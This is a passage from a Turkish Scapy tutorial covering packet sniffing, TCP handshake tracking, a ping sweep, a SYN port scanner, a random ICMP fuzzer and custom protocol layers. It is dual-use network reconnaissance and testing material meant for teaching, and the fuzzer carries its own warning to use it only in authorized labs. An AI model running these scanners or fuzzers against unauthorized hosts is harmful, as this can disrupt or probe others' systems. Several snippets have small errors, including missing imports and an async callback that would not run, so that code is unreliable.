**`scapy-http` Eklentisi:**
Daha gelişmiş HTTP analizi için `scapy-http` (veya `http_parser` gibi kütüphanelerle entegrasyon) kullanılabilir. Bu eklenti, `HTTPRequest` ve `HTTPResponse` gibi özel katmanlar sunarak HTTP başlıklarını ve gövdelerini daha kolay parse etmenizi sağlar.
```bash
# pip install scapy-http  (veya eski adıyla scapy_http)
```
```python
# from scapy.all import Ether, IP, TCP # Temel katmanlar
# from scapy_http import http # Veya from scapy.layers.http import HTTPRequest, HTTPResponse (versiyona göre değişir)
# ... sniff içinde if pkt.haslayer(http.HTTPRequest): ...
```

**Sorun Giderme Senaryoları:**
*   **Web Sitesi Yüklenmiyor:** HTTP istekleri var ama cevap yoksa, sunucu çalışmıyor, ulaşılamıyor veya ağ bağlantı sorunu olabilir.
*   **HTTP Hata Kodları:** Cevaplardaki durum kodlarını (404 Not Found, 500 Internal Server Error, 403 Forbidden vb.) inceleyin.
*   **Yavaş Yükleme Süreleri:** İstek ile cevap arasındaki süreyi ve veri aktarım hızını izleyin.
*   **Yanlış İçerik:** `Content-Type` başlığını ve gelen içeriği kontrol edin.
*   **Yönlendirmeler (Redirects):** 3xx durum kodlarını (301, 302) ve `Location` başlığını takip edin.

### TCP Üçlü El Sıkışma (Three-Way Handshake) ve Kapanış Analizi
TCP, güvenilir bir bağlantı kurmak için üçlü el sıkışma kullanır:
1.  **SYN:** İstemci, sunucuya bir SYN (Synchronize) paketi gönderir. Rastgele bir başlangıç sequence numarası (Client_ISN) içerir.
2.  **SYN/ACK:** Sunucu, istemciye bir SYN/ACK (Synchronize-Acknowledge) paketi ile cevap verir. Kendi rastgele başlangıç sequence numarasını (Server_ISN) ve istemcinin Client_ISN+1 değerini acknowledgment numarası olarak içerir.
3.  **ACK:** İstemci, sunucunun SYN/ACK'ını aldığını onaylamak için bir ACK (Acknowledge) paketi gönderir. Sunucunun Server_ISN+1 değerini acknowledgment numarası olarak içerir.

Bağlantı kapanışı genellikle dörtlü el sıkışma ile olur (her iki taraf da FIN gönderir ve ACK alır).

**Scapy ile TCP Bağlantılarını İzleme:**
```python
from scapy.all import sniff, TCP, IP

# Basit bir bağlantı durumu takibi için dictionary
tcp_sessions = {}

def tcp_handshake_analyzer(packet):
    if packet.haslayer(TCP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        flags = packet[TCP].flags
        
        # Oturum anahtarı (source_ip, source_port, dest_ip, dest_port)
        # Her zaman düşük portu başa alarak yönü normalleştirebiliriz veya iki yönü ayrı takip edebiliriz.
        # Basitlik için tek yönlü takip:
        session_key_fwd = (ip_src, sport, ip_dst, dport)
        session_key_rev = (ip_dst, dport, ip_src, sport) # Tersi yön

        if 'S' in str(flags) and not 'A' in str(flags): # Sadece SYN bayrağı (SYN)
            tcp_sessions[session_key_fwd] = "SYN_SENT"
            print(f"TCP SYN: {ip_src}:{sport} -> {ip_dst}:{dport} (Seq: {packet[TCP].seq})")
            
        elif 'S' in str(flags) and 'A' in str(flags): # SYN/ACK bayrağı
            # Eğer bu bir cevapsa, ters yöndeki oturum anahtarına bak
            if session_key_rev in tcp_sessions and tcp_sessions[session_key_rev] == "SYN_SENT":
                tcp_sessions[session_key_rev] = "SYN_ACK_RECEIVED" # İstemci tarafı için
                tcp_sessions[session_key_fwd] = "SYN_ACK_SENT" # Sunucu tarafı için
                print(f"TCP SYN/ACK: {ip_src}:{sport} -> {ip_dst}:{dport} (Seq: {packet[TCP].seq}, Ack: {packet[TCP].ack})")
            else: # Beklenmedik SYN/ACK
                print(f"TCP SYN/ACK (beklenmedik): {ip_src}:{sport} -> {ip_dst}:{dport}")

        elif 'A' in str(flags) and not ('S' in str(flags) or 'F' in str(flags) or 'R' in str(flags)): # Sadece ACK (Veri veya Handshake ACK'ı)
            # Bu ACK, SYN/ACK'a cevap olabilir
            if session_key_fwd in tcp_sessions and tcp_sessions[session_key_fwd] == "SYN_ACK_SENT": # Sunucu için bu ACK istemciden gelir
                 print(f"TCP ACK (Handshake tamamlandı - Sunucu perspektifi): {ip_src}:{sport} -> {ip_dst}:{dport} (Seq: {packet[TCP].seq}, Ack: {packet[TCP].ack})")
                 tcp_sessions[session_key_fwd] = "ESTABLISHED"
            elif session_key_rev in tcp_sessions and tcp_sessions[session_key_rev] == "SYN_ACK_RECEIVED": # İstemci için bu ACK sunucuya gönderilir
                 print(f"TCP ACK (Handshake tamamlandı - İstemci perspektifi): {ip_src}:{sport} -> {ip_dst}:{dport} (Seq: {packet[TCP].seq}, Ack: {packet[TCP].ack})")
                 tcp_sessions[session_key_rev] = "ESTABLISHED"
            # Zaten kurulu bir bağlantıda veri ACK'ı da olabilir, bu kısmı daha detaylı işlemek gerekir.

        elif 'F' in str(flags): # FIN bayrağı (Bağlantı kapatma isteği)
            print(f"TCP FIN: {ip_src}:{sport} -> {ip_dst}:{dport} (Flags: {flags})")
            # Durumları FIN_WAIT_1, FIN_WAIT_2, CLOSE_WAIT vb. olarak güncellemek gerekir.
        
        elif 'R' in str(flags): # RST bayrağı (Bağlantı resetleme)
            print(f"TCP RST: {ip_src}:{sport} -> {ip_dst}:{dport} (Bağlantı sıfırlandı)")
            if session_key_fwd in tcp_sessions: del tcp_sessions[session_key_fwd]
            if session_key_rev in tcp_sessions: del tcp_sessions[session_key_rev]
        
        # print(tcp_sessions) # Oturum durumlarını görmek için

# print("TCP bağlantı trafiği dinleniyor... (Ctrl+C ile durdur)")
# sniff(filter="tcp", prn=tcp_handshake_analyzer, store=0, iface="eth0")
```
**Not:** Bu, TCP durum makinesinin çok basitleştirilmiş bir temsilidir. Gerçek bir TCP durum takibi çok daha karmaşıktır ve sequence/acknowledgment numaralarının dikkatli bir şekilde izlenmesini gerektirir. `scapy.contrib.TCPOptionMPTCP` gibi bazı Scapy eklentileri veya `netstat`, `ss` gibi sistem araçları daha detaylı bilgi verebilir.

**Sorun Giderme Senaryoları:**
*   **Bağlantı Kurulamıyor:**
    *   İstemci SYN gönderiyor ama SYN/ACK gelmiyorsa: Sunucu çalışmıyor, port kapalı/filtrelenmiş veya ağ sorunu.
    *   SYN/ACK geliyor ama istemci ACK göndermiyorsa: İstemci tarafında sorun veya ağ sorunu.
*   **Bağlantı Aniden Kesiliyor:** RST paketlerini inceleyin. Kimin gönderdiğine (istemci mi, sunucu mu, arada bir firewall mı?) ve nedenine bakın.
*   **Yüksek Gecikme (Latency):** SYN, SYN/ACK ve ACK paketleri arasındaki zaman farklarını inceleyin.
*   **TCP Retransmissions (Yeniden Göndermeler):** Aynı sequence numarasına sahip birden fazla paket görülüyorsa, paket kaybı yaşanıyor olabilir. (Bu analiz, sequence numaralarını detaylı takip etmeyi gerektirir).

---

## 10. Scapy ile Python Scriptleri Geliştirmek

Şimdiye kadar Scapy'yi çoğunlukla interaktif kabuğunda kullandık. Ancak Scapy'nin gerçek gücü, Python scriptleri içinde kullanılarak otomasyon, özelleştirilmiş araç geliştirme ve karmaşık görevlerin yerine getirilmesiyle ortaya çıkar. Bu bölümde, Scapy'yi Python scriptlerinize nasıl entegre edeceğinizi ve pratik örneklerle nasıl kullanacağınızı göreceğiz.

### Scapy'yi Python Scriptine Dahil Etmek
Bir Python scriptinde Scapy fonksiyonlarını ve katmanlarını kullanmak için öncelikle Scapy kütüphanesini içe aktarmanız gerekir.

En yaygın yöntem, tüm Scapy fonksiyonlarını ve katmanlarını mevcut namespace'e dahil etmektir:
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Scapy'nin tüm içeriğini içe aktar
from scapy.all import *

# Artık IP, TCP, send, sniff gibi tüm Scapy öğelerini doğrudan kullanabilirsiniz
# Örneğin:
# pkt = IP(dst="google.com")/ICMP()
# send(pkt)
```
Bu yöntem, interaktif kabuktaki kullanıma benzer ve pratiktir, ancak büyük projelerde isim çakışmalarına (namespace pollution) neden olabilir.

Alternatif olarak, sadece ihtiyaç duyduğunuz modülleri veya öğeleri içe aktarabilirsiniz:
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.layers.inet import IP, TCP, ICMP, UDP # Sadece IPv4 katmanları
from scapy.layers.l2 import Ether, ARP          # Sadece Katman 2 katmanları
from scapy.sendrecv import send, sr1, sniff     # Sadece belirli gönderme/alma fonksiyonları
# from scapy.volatile import RandShort, RandIP  # Rastgele değer üreteçleri

# Kullanım:
# pkt = IP(dst="google.com")/ICMP() # Doğrudan IP ve ICMP kullanabilirsiniz
# cevap = sr1(pkt)
```
Veya Scapy'yi bir namespace altında içe aktarabilirsiniz (daha az yaygın):
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import scapy.all as scapy

# Kullanım:
# pkt = scapy.IP(dst="google.com")/scapy.ICMP()
# scapy.send(pkt)
```
Bu rehberdeki script örneklerinde genellikle `from scapy.all import *` yöntemi kullanılacaktır, çünkü bu, Scapy'nin esnekliğini ve kullanım kolaylığını en iyi yansıtan yöntemdir.

**Scriptinizi Çalıştırılabilir Yapmak (Linux/macOS):**
Script dosyanızın başına `#!/usr/bin/env python3` satırını ekledikten sonra, terminalde aşağıdaki komutla scriptinizi çalıştırılabilir hale getirebilirsiniz:
```bash
chmod +x script_adi.py
```
Artık scriptinizi `./script_adi.py` şeklinde çalıştırabilirsiniz (eğer root yetkisi gerekiyorsa `sudo ./script_adi.py`).

### Fonksiyonlar ve Döngülerle Otomasyon
Python'un fonksiyonları ve döngüleri, Scapy ile tekrarlayan görevleri otomatikleştirmek için mükemmeldir.

**Örnek: Belirli Bir IP Aralığını Pingleyen Script**
```python
#!/usr/bin/env python3
from scapy.all import IP, ICMP, sr1, Ether
import ipaddress # IP adresi yönetimi için

def ping_host(ip_address, timeout=1, verbose=False):
    """Verilen IP adresine ICMP echo request gönderir ve durumu döndürür."""
    print(f"[*] {ip_address} adresine ping gönderiliyor...")
    try:
        # conf.verb = 0 # Global Scapy çıktısını kapatmak için
        response = sr1(IP(dst=str(ip_address))/ICMP(), timeout=timeout, verbose=verbose)
        if response and response.haslayer(ICMP) and response[ICMP].type == 0: # Echo reply
            print(f"[+] {ip_address} aktif.")
            return True
        else:
            print(f"[-] {ip_address} aktif değil veya ICMP kapalı.")
            return False
    except Exception as e:
        print(f"[!] {ip_address} adresine ping gönderilirken hata: {e}")
        return False

def ping_sweep_network(network_cidr, timeout=0.5):
    """Belirtilen CIDR bloğundaki tüm hostlara ping atar."""
    active_hosts = []
    try:
        network = ipaddress.ip_network(network_cidr, strict=False)
    except ValueError:
        print(f"[!] Geçersiz ağ adresi: {network_cidr}")
        return active_hosts

    print(f"\n[*] {network_cidr} ağında Ping Sweep başlatılıyor...")
    for host_ip_obj in network.hosts(): # .hosts() ağ ve broadcast'i hariç tutar
        if ping_host(host_ip_obj, timeout=timeout, verbose=False):
            active_hosts.append(str(host_ip_obj))
    
    print("\n[+] Tarama Tamamlandı. Aktif Hostlar:")
    if active_hosts:
        for host in active_hosts:
            print(f"  - {host}")
    else:
        print("  Aktif host bulunamadı.")
    return active_hosts

# if __name__ == "__main__":
#     target_network = "192.168.1.0/29" # Test için küçük bir aralık
#     # target_network = input("Taranacak ağı girin (örn: 192.168.1.0/24): ")
#     akt_hostlar = ping_sweep_network(target_network)
```
Bu script, `ping_host` fonksiyonu ile tek bir hosta ping atar ve `ping_sweep_network` fonksiyonu ile bu işlemi bir ağdaki tüm hostlar için tekrarlar.

### Argüman İşleme (`sys.argv`, `argparse`)
Scriptlerinizi daha esnek ve kullanıcı dostu hale getirmek için komut satırı argümanlarını işlemeniz gerekir.

*   **`sys.argv`**: En basit yöntemdir. `sys.argv` bir listedir; ilk elemanı (`sys.argv[0]`) scriptin adıdır, sonraki elemanlar ise komut satırında verilen argümanlardır.
*   **`argparse`**: Daha güçlü ve kullanıcı dostu bir komut satırı arayüzü oluşturmak için Python'un standart kütüphanesidir. Yardım mesajları, argüman türleri, varsayılan değerler gibi özellikleri destekler.

**`argparse` ile Gelişmiş Port Tarayıcı Scripti Örneği:**
Bu örnek, Bölüm 6'daki TCP SYN Scan fonksiyonunu kullanarak bir komut satırı aracı oluşturur.
```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, sr1, send, RandShort, conf
import argparse
import sys
from datetime import datetime

# Bölüm 6'daki tcp_syn_scan fonksiyonunu buraya alabilir veya import edebiliriz.
# Basitleştirilmiş bir versiyonunu yeniden yazalım:
def scan_port(target_ip, port, timeout=1):
    """Belirtilen porta TCP SYN taraması yapar."""
    src_port = RandShort()
    syn_packet = IP(dst=target_ip)/TCP(sport=src_port, dport=port, flags="S")
    response = sr1(syn_packet, timeout=timeout, verbose=0) # Scapy çıktılarını script içinde kapat
    
    if response is None:
        return "Filtrelenmiş"
    elif response.haslayer(TCP):
        if response[TCP].flags == 0x12: # SYN/ACK
            rst_packet = IP(dst=target_ip)/TCP(sport=src_port, dport=port, flags="R", seq=response[TCP].ack)
            send(rst_packet, verbose=0)
            return "Açık"
        elif response[TCP].flags == 0x14: # RST/ACK
            return "Kapalı"
    elif response.haslayer(ICMP) and int(response[ICMP].type) == 3 and \
         int(response[ICMP].code) in [1, 2, 3, 9, 10, 13]:
        return "Filtrelenmiş (ICMP)"
    return "Bilinmiyor"


def parse_ports(port_string):
    """Port string'ini (örn: "22,80,443-445") port listesine çevirir."""
    ports = set()
    if not port_string:
        return list(ports)
    try:
        for part in port_string.split(','):
            part = part.strip()
            if '-' in part:
                start, end = map(int, part.split('-'))
                if not (0 < start <= 65535 and 0 < end <= 65535 and start <= end) :
                    raise ValueError("Geçersiz port aralığı")
                ports.update(range(start, end + 1))
            else:
                port_num = int(part)
                if not (0 < port_num <= 65535):
                    raise ValueError("Geçersiz port numarası")
                ports.add(port_num)
        return sorted(list(ports))
    except ValueError as e:
        print(f"[!] Hatalı port formatı: {port_string} ({e})")
        sys.exit(1)

def main_port_scanner():
    parser = argparse.ArgumentParser(description="Scapy ile Basit TCP SYN Port Tarayıcı",
                                     formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("target_ip", help="Taranacak hedef IP adresi veya alan adı.")
    parser.add_argument("-p", "--ports", type=str, default="21,22,23,25,53,80,110,111,135,139,443,445,993,995,1723,3306,3389,5900,8080",
                        help="Taranacak portlar.\n"
                             "Örnekler:\n"
                             "  -p 80\n"
                             "  -p 22,80,443\n"
                             "  -p 1-1024\n"
                             "  -p 22,80,1000-2000 (Varsayılan: yaygın portlar)")
    parser.add_argument("-t", "--timeout", type=float, default=0.5,
                        help="Her port için cevap bekleme süresi (saniye cinsinden, varsayılan: 0.5).")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Daha ayrıntılı çıktı (tüm port durumlarını gösterir).")

    args = parser.parse_args()

    target = args.target_ip
    ports_to_scan = parse_ports(args.ports)
    timeout = args.timeout
    
    if not ports_to_scan:
        print("[!] Taranacak port belirtilmedi veya geçersiz format.")
        parser.print_help()
        sys.exit(1)

    # Scapy'nin genel ayrıntı seviyesini düşür
    conf.verb = 0 

    print("-" * 50)
    print(f"Hedef: {target}")
    print(f"Taranacak Portlar: {len(ports_to_scan)} adet")
    print(f"Başlangıç Zamanı: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 50)

    open_ports_found = []

    try:
        for i, port in enumerate(ports_to_scan):
            status = scan_port(target, port, timeout)
            if status == "Açık":
                print(f"Port {port:<5}/tcp   AÇIK")
                open_ports_found.append(port)
            elif args.verbose: # Eğer -v bayrağı varsa tüm durumları göster
                 print(f"Port {port:<5}/tcp   {status.upper()}")
            
            # Kullanıcıya ilerleme hakkında bilgi ver
            progress = ((i + 1) / len(ports_to_scan)) * 100
            sys.stdout.write(f"\rİlerleme: {progress:.2f}% ({i+1}/{len(ports_to_scan)})")
            sys.stdout.flush()

    except KeyboardInterrupt:
        print("\n[!] Tarama kullanıcı tarafından durduruldu.")
    except Exception as e:
        print(f"\n[!] Bir hata oluştu: {e}")
    finally:
        print("\n" + "-" * 50)
        print("Tarama Tamamlandı.")
        if open_ports_found:
            print(f"Bulunan Açık Portlar: {', '.join(map(str, open_ports_found))}")
        else:
            print("Açık port bulunamadı.")
        print(f"Bitiş Zamanı: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("-" * 50)

# if __name__ == "__main__":
#     # Root yetkisi gerekebilir (özellikle ham soket kullanımı ve bazı arayüz modları için)
#     # if os.geteuid() != 0:
#     #     print("[!] Bu scriptin bazı özellikleri için root yetkisi gerekebilir.")
#     #     # sys.exit("Lütfen scripti root olarak çalıştırın.") # Opsiyonel: Zorla çıkış
#     main_port_scanner()

# Scripti çalıştırmak için:
# sudo python3 port_scanner_script.py scanme.nmap.org
# sudo python3 port_scanner_script.py 192.168.1.1 -p 1-100 -t 0.2 -v
```
**Bu scriptin özellikleri:**
*   `argparse` ile kullanıcı dostu komut satırı argümanları.
*   Port aralıklarını (`1-1024`) ve virgülle ayrılmış listeleri (`22,80,443`) işleyebilen `parse_ports` fonksiyonu.
*   Sessiz çalışma için `conf.verb = 0`.
*   Tarama ilerlemesini gösterme.
*   Açık portları ve isteğe bağlı olarak tüm port durumlarını listeleme.
*   Başlangıç ve bitiş zamanlarını gösterme.

### Örnek Otomasyon Scriptleri
Scapy'nin esnekliği sayesinde birçok farklı ağ aracını veya otomasyon scriptini geliştirebilirsiniz.

#### Gelişmiş Port Tarayıcı (Yukarıdaki örnek geliştirilebilir)
*   Farklı tarama türleri ekleme (UDP, TCP Connect, FIN vb.).
*   Servis ve versiyon tespiti (banner grabbing).
*   Sonuçları dosyaya kaydetme (CSV, XML, JSON).
*   Çoklu thread/proses kullanarak tarama hızını artırma (dikkatli kullanılmalı, hedefi yormamak için).

#### Ağ Keşif Aracı
*   ARP ping, ICMP ping sweep, ve port tarama adımlarını birleştirerek bir ağdaki aktif cihazları ve açık portlarını bulan bir araç.
*   Pasif keşif (sadece dinleyerek bilgi toplama) özellikleri eklenebilir.
*   Belirli servislere (örn: SMB, SNMP, HTTP) yönelik sorgular göndererek ek bilgi toplama.

#### Özelleştirilmiş Paket Üreteci (Packet Crafter)
*   Belirli bir protokolün (örn: özel bir endüstriyel protokol veya yeni geliştirilen bir protokol) test edilmesi için özel paketler üreten bir araç.
*   Paket alanlarını komut satırından veya bir yapılandırma dosyasından alarak dinamik paket oluşturma.
*   Fuzzing (hatalı veya beklenmedik girdilerle paket oluşturup gönderme) amaçlı kullanılabilir.

**Örnek: Basit Bir Fuzzer (ICMP Ping Fuzzer)**
```python
#!/usr/bin/env python3
from scapy.all import IP, ICMP, Raw, send, RandByte, RandString
import time
import random

def icmp_fuzzer(target_ip, num_packets, max_payload_size=100, delay=0.1):
    print(f"[*] {target_ip} adresine ICMP Fuzzer başlatılıyor ({num_packets} paket)...")
    for i in range(num_packets):
        # Rastgele ICMP type ve code (0-255)
        icmp_type = RandByte() # Veya random.randint(0, 255)
        icmp_code = RandByte() # Veya random.randint(0, 255)
        
        # Rastgele payload boyutu ve içeriği
        payload_size = random.randint(0, max_payload_size)
        payload = RandString(size=payload_size)
        
        # Rastgele IP ID ve TTL (isteğe bağlı)
        ip_id = random.randint(0, 65535)
        ip_ttl = random.randint(1, 255)

        fuzz_packet = IP(dst=target_ip, id=ip_id, ttl=ip_ttl)/ \
                      ICMP(type=icmp_type, code=icmp_code)/ \
                      Raw(load=payload)
        
        print(f"\r[*] Gönderilen Fuzz Paketi #{i+1}: Type={int(icmp_type)}, Code={int(icmp_code)}, PayloadSize={payload_size} B", end="")
        sys.stdout.flush()
        
        try:
            send(fuzz_packet, verbose=0)
        except Exception as e:
            print(f"\n[!] Paket gönderilirken hata: {e}")
            
        time.sleep(delay)
        
    print("\n[+] ICMP Fuzzing tamamlandı.")

# if __name__ == "__main__":
#     # HEDEF SİSTEMİN ÇÖKEBİLECEĞİNİ VEYA İSTENMEYEN DAVRANIŞLAR SERGİLEYEBİLECEĞİNİ UNUTMAYIN!
#     # SADECE İZİNLİ VE KONTROLLÜ TEST ORTAMLARINDA KULLANIN!
#     target = "192.168.1.X" # Test edilecek IP
#     # icmp_fuzzer(target, num_packets=1000, delay=0.05)
```
Bu fuzzer, hedefe rastgele ICMP type, code ve payload içeren paketler gönderir. Amaç, hedef sistemin bu beklenmedik girdilere nasıl tepki verdiğini görmek ve potansiyel çökmeleri veya hataları tetiklemektir.

### Scriptlerde Hata Yönetimi (`try-except`)
Ağ işlemleri sırasında birçok hata oluşabilir (timeout, host ulaşılamıyor, yetki sorunları vb.). Scriptlerinizin daha sağlam olması için `try-except` blokları kullanarak bu hataları yakalamalı ve uygun şekilde işlemelisiniz.

```python
# try:
#     # Scapy işlemleri (örn: sr1, sniff)
#     cevap = sr1(...)
#     if cevap is None:
#         print("Timeout veya cevap yok.")
#     else:
#         # Cevabı işle
#         pass
# except PermissionError:
#     print("[!] Yetki hatası! Lütfen scripti root olarak çalıştırın.")
# except OSError as e: # Genellikle ağ arayüzü sorunları
#     print(f"[!] İşletim sistemi hatası (örn: ağ arayüzü bulunamadı): {e}")
# except Exception as e: # Diğer beklenmedik hatalar
#     print(f"[!] Beklenmedik bir hata oluştu: {e}")
# finally:
#     # Her durumda çalışacak kod (örn: kaynakları serbest bırakma)
#     print("İşlem tamamlandı veya hata oluştu.")
```

---

## 11. İleri Seviye Scapy Teknikleri

Scapy'nin temel kullanımının ötesine geçerek, daha karmaşık senaryoları ele almak, performansı optimize etmek ve Scapy'yi kendi ihtiyaçlarınıza göre genişletmek için bazı ileri seviye teknikleri inceleyeceğiz.

### Kendi Protokol Katmanlarınızı Tanımlama
Scapy, geniş bir protokol yelpazesini desteklese de, bazen standart olmayan, özel veya yeni geliştirilen bir protokolle çalışmanız gerekebilir. Scapy, kendi protokol katmanlarınızı tanımlamanıza olanak tanır.

Bir protokol katmanı tanımlamak için temel adımlar şunlardır:
1.  `Packet` sınıfından miras alan yeni bir sınıf oluşturun.
2.  `name` özelliğini protokolünüzün adıyla ayarlayın.
3.  `fields_desc` listesini tanımlayın. Bu liste, protokol başlığınızdaki alanları (fields) ve bunların türlerini (örn: `ByteField`, `ShortField`, `IPField`, `ConditionalField` vb.) içerir.
4.  (İsteğe Bağlı) `bind_layers()` fonksiyonunu kullanarak yeni katmanınızı mevcut bir alt katmana veya yeni katmanınızın üzerine gelecek bir üst katmana bağlayın. Bu, Scapy'nin paketleri otomatik olarak doğru şekilde ayrıştırmasına (dissect) ve oluşturmasına yardımcı olur.
5.  (İsteğe Bağlı) Alanların varsayılan değerlerini, nasıl gösterileceğini (`repr`) veya nasıl işleneceğini özelleştirmek için ek metotlar (`post_build`, `pre_dissect`, `do_dissect_payload` vb.) tanımlayabilirsiniz.

**Örnek: Basit Bir Özel Protokol Katmanı**
Diyelim ki, bir "MesajTipi" (1 byte) ve bir "MesajID" (2 byte) içeren "OzelProtokol" adında basit bir protokolümüz var ve bu protokol TCP port 12345 üzerinden taşınıyor.

```python
from scapy.all import Packet, bind_layers
from scapy.fields import XByteField, ShortField, StrFixedLenField
from scapy.layers.inet import TCP # TCP katmanına bağlamak için

class OzelProtokol(Packet):
    name = "OzelProtokol"
    fields_desc = [
        XByteField("mesajTipi", 0),  # Varsayılan değeri 0 olan 1 byte'lık alan
        ShortField("mesajID", 1),    # Varsayılan değeri 1 olan 2 byte'lık alan
        # Örnek olarak sabit uzunluklu bir payload alanı ekleyebiliriz
        # StrFixedLenField("veri", "", length=10) 
    ]

    # Belirli bir mesaj tipine göre payload'un nasıl olacağını tanımlayabiliriz (daha karmaşık)
    # def guess_payload_class(self, payload):
    #     if self.mesajTipi == 0x01:
    #         return ProtokolTip1Payload
    #     elif self.mesajTipi == 0x02:
    #         return ProtokolTip2Payload
    #     else:
    #         return Packet.guess_payload_class(self, payload)

# OzelProtokol'ü TCP katmanına bağlayalım
# Eğer TCP paketinin kaynak veya hedef portu 12345 ise,
# ve TCP payload'u varsa, Scapy bunu OzelProtokol olarak ayrıştırmaya çalışacak.
bind_layers(TCP, OzelProtokol, sport=12345)
bind_layers(TCP, OzelProtokol, dport=12345)

# Kullanım Örneği (Scapy kabuğunda veya scriptte):
# from scapy.all import IP, TCP, send, sniff

# Özel protokolümüzle bir paket oluşturalım
# pkt_ozel = IP(dst="127.0.0.1")/TCP(dport=12345)/OzelProtokol(mesajTipi=0x0A, mesajID=1001)
# pkt_ozel.show()
# # Raw payload eklemek için:
# # pkt_ozel_payload = IP(dst="127.0.0.1")/TCP(dport=12345)/OzelProtokol(mesajTipi=0x0B)/"Bu bir test verisidir"

# # Bu paketi gönderelim (bir sunucu bu portu dinliyorsa)
# # send(pkt_ozel)

# # Bu port üzerinden gelen trafiği dinleyelim
# def ozel_protokol_isleyici(paket):
#     if paket.haslayer(OzelProtokol):
#         print("Özel Protokol Paketi Yakalandı:")
#         print(f"  Mesaj Tipi: {hex(paket[OzelProtokol].mesajTipi)}")
#         print(f"  Mesaj ID: {paket[OzelProtokol].mesajID}")
#         if paket[OzelProtokol].payload: # Eğer ham veri varsa
#             print(f"  Payload: {paket[OzelProtokol].payload}")
#         paket.show() # Tüm paketi göster
#     else: # TCP port 12345 ama OzelProtokol olarak ayrıştırılamadıysa (örn: sadece TCP segmenti)
#         if TCP in paket and (paket[TCP].sport == 12345 or paket[TCP].dport == 12345):
#             print("TCP port 12345 üzerinde OzelProtokol olmayan paket:")
#             paket.summary()


# print("TCP port 12345 dinleniyor...")
# sniff(filter="tcp port 12345", prn=ozel_protokol_isleyici, iface="lo", count=5) # Loopback arayüzünde test için
```
Scapy'nin `scapy/fields.py` dosyası, kullanabileceğiniz birçok farklı alan türünü içerir (`BitField`, `ConditionalField`, `PacketListField`, `EnumField` vb.). Kendi protokolünüzün karmaşıklığına göre bu alanları kullanabilirsiniz.

### Scapy ve Diğer Araçlar (Wireshark, Nmap Entegrasyonu)

*   **Wireshark:** Scapy ile yakaladığınız paketleri (`.pcap` formatında `wrpcap()` ile kaydederek) Wireshark'ta çok daha detaylı analiz edebilirsiniz. Wireshark'ın güçlü filtreleme ve protokol ayrıştırma yetenekleri, Scapy ile topladığınız verileri anlamlandırmada çok yardımcı olur. Aynı şekilde, Wireshark ile yakaladığınız bir `.pcap` dosyasını Scapy'de `rdpcap()` ile okuyup manipüle edebilirsiniz.

*   **Nmap:**
    *   Scapy, Nmap'in yaptığı bazı tarama türlerini (SYN scan, FIN scan vb.) taklit edebilir. Ancak Nmap, işletim sistemi tespiti, servis versiyon tespiti gibi konularda çok daha gelişmiş ve optimize edilmiştir.
    *   Nmap'in script motoru (NSE - Nmap Scripting Engine) Lua ile yazılmıştır. Scapy scriptlerinizi, Nmap taramalarından elde edilen sonuçlara göre tetikleyebilir veya Nmap'in bulamadığı özel durumları Scapy ile test edebilirsiniz.
    *   Nmap çıktılarını (XML formatı) parse edip, Scapy ile bu hedeflere yönelik daha spesifik testler yapabilirsiniz.

*   **tcpdump:** `tcpdump` ile yakalanan `.pcap` dosyaları da Scapy ile okunabilir. `tcpdump`'ın BPF filtreleme sözdizimi Scapy'nin `sniff()` fonksiyonundaki `filter` parametresiyle aynıdır.

*   **Diğer Python Kütüphaneleri:** Scapy, Python ekosistemindeki diğer kütüphanelerle (örn: `requests` ile HTTP istekleri yapmak, `paramiko` ile SSH bağlantıları kurmak, `matplotlib` ile veri görselleştirmek) kolayca entegre edilebilir.

### Scapy'de Asenkron İşlemler
Uzun süren dinleme (`sniff`) veya çok sayıda paket gönderme/alma (`sr`) işlemleri bazen programınızın diğer kısımlarını bloke edebilir. Scapy'nin kendisi doğrudan `async/await` gibi modern Python asenkron özelliklerini tam olarak desteklemese de, bazı yaklaşımlar kullanılabilir:

*   **`sniff(..., store=0, prn=callback_func)` ve Threading/Multiprocessing:** `sniff` işlemini ayrı bir thread veya process'te çalıştırıp, yakalanan paketleri bir `queue` aracılığıyla ana thread'e iletebilirsiniz. `prn` ile çağrılan callback fonksiyonu paketleri bu `queue`'ya yazar.
    ```python
    # import threading
    # import queue
    # from scapy.all import sniff, IP
    
    # packet_queue = queue.Queue()
    
    # def packet_handler_for_thread(pkt):
    #     packet_queue.put(pkt)
    
    # def start_sniffer_thread(iface="eth0", filter_str=""):
    #     print(f"Sniffer thread'i başlatılıyor ({iface})...")
    #     sniff_thread = threading.Thread(target=sniff, 
    #                                     kwargs={'iface': iface, 
    #                                             'prn': packet_handler_for_thread, 
    #                                             'filter': filter_str,
    #                                             'store': 0})
    #     sniff_thread.daemon = True # Ana program bittiğinde thread de bitsin
    #     sniff_thread.start()
    #     return sniff_thread

    # # Ana programda:
    # # sniffer = start_sniffer_thread(filter_str="icmp")
    # # try:
    # #     while True:
    # #         if not packet_queue.empty():
    # #             pkt = packet_queue.get()
    # #             print("Ana thread'de işlenen paket:", pkt.summary())
    # #         time.sleep(0.1) # CPU'yu yormamak için
    # # except KeyboardInterrupt:
    # #     print("Program durduruluyor...")
    ```

*   **Scapy'nin `AsyncSniffer` Sınıfı:** Scapy'nin daha yeni versiyonlarında (özellikle GitHub master branch'inde) `AsyncSniffer` adında, `sniff` işlemini asenkron olarak yönetmek için bir sınıf bulunmaktadır. Bu, Python'un `asyncio` kütüphanesiyle daha iyi entegrasyon sağlayabilir.
    ```python
    # from scapy.all import AsyncSniffer, IP
    # import asyncio
    
    # async def process_packet_async(pkt):
    #     print("Async işlenen paket:", pkt.summary())
    #     # Burada await ile başka asenkron işlemler yapılabilir
    
    # async def main_async_sniff():
    #     sniffer = AsyncSniffer(iface="eth0", prn=process_packet_async, filter="icmp", store=0)
    #     sniffer.start()
    #     print("Async sniffer başlatıldı. 10 saniye dinlenecek...")
    #     await asyncio.sleep(10) # Örnek olarak 10 saniye bekle
    #     results = sniffer.stop() # Durdur ve (eğer store=True ise) sonuçları al
    #     print("Async sniffer durduruldu.")
